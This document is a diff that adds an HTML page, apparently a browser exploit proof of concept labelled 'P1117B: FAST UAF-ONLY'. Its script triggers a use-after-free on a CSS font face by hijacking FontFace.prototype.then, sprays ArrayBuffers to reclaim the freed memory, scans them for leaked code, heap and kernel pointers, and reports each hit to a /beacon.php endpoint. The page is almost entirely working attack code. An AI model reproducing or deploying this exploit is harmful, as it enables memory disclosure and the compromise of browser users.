@@ -1,0 +1,121 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1117b</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}
+</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){
+  if(typeof v!=='bigint'||v===0n)return'';
+  var hi=Number(v>>32n);
+  if(hi>=0x200&&hi<=0x7FFF)return'CODE';
+  if(hi>=0x10&&hi<=0xFF)return'HEAP';
+  if(hi>=0xFFFF8000)return'KERN';
+  if(v<0x10000n)return'small';
+  return'val';
+}
+
+B('P1117B-BOOT','t='+Date.now());
+log('phase','=== P1117B: FAST UAF-ONLY (exact P1112 technique) ===');
+
+// Prevent auto-reload from interrupting us
+// Signal we're running by setting a window flag
+window.__p1117b_running=true;
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var allHits=[];
+var round=0;
+var maxRounds=8;
+
+function doRound(){
+  if(round>=maxRounds){
+    var summary='rounds='+maxRounds+'|hits='+allHits.length;
+    if(allHits.length>0)summary+='|data='+allHits.slice(0,8).join(';;');
+    else summary+='|ALL_ZERO';
+    B('P1117B-FINAL',summary);
+    log('phase','=== DONE: '+allHits.length+' hits in '+maxRounds+' rounds ===');
+    return;
+  }
+
+  log('info','Round '+round+'...');
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:r"+round+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('f'+round,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);
+  void ff.loaded;
+
+  var fired=false,map=null,found=false;
+  var origThen=Object.getOwnPropertyDescriptor(FontFace.prototype,'then');
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    // FREE the CSSFontFace
+    if(st.parentNode)st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight; // force layout = process freed memory
+    // SPRAY ArrayBuffers to reclaim the slot
+    map=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+    }
+    try{document.fonts.check('1em r'+round);}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em f'+round+', r'+round,'AB').then(function(){},function(){});
+
+  // Poll for non-zero data in the 192-byte buffers
+  for(var t=5;t<=250;t+=3){(function(ms,rnd){setTimeout(function(){
+    if(found||!map)return;
+    // Scan buffers around the 192-byte size class (indices 32-39)
+    // Also scan nearby sizes
+    for(var bi=24;bi<56;bi++){
+      if(!map[bi])continue;
+      var b=new BigUint64Array(map[bi].ab);
+      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+      if(nz>0&&!found){
+        found=true;
+        var ptrs=[];
+        for(var q=0;q<b.length;q++){
+          if(b[q]!==0n){
+            var tag=ptrTag(b[q]);
+            ptrs.push('+'+q*8+'='+hex64(b[q])+'('+tag+')');
+          }
+        }
+        var result='r'+rnd+'|bi='+bi+'|sz='+map[bi].size+'|nz='+nz+'|'+ptrs.join(',');
+        allHits.push(result);
+        B('P1117B-HIT',result);
+        log('win','HIT r'+rnd+': buf='+bi+' sz='+map[bi].size+' nz='+nz+' '+ptrs.join(' '));
+      }
+    }
+  },ms);})(t,round);}
+
+  // Next round after poll window
+  setTimeout(function(){
+    if(origThen)Object.defineProperty(FontFace.prototype,'then',origThen);
+    else delete FontFace.prototype.then;
+    if(!found){
+      B('P1117B-MISS','r'+round);
+      log('info','Round '+round+': nz=0');
+    }
+    map=null;
+    round++;
+    doRound();
+  },300);
+}
+
+// Start immediately!
+doRound();
+</script>
+</body></html>
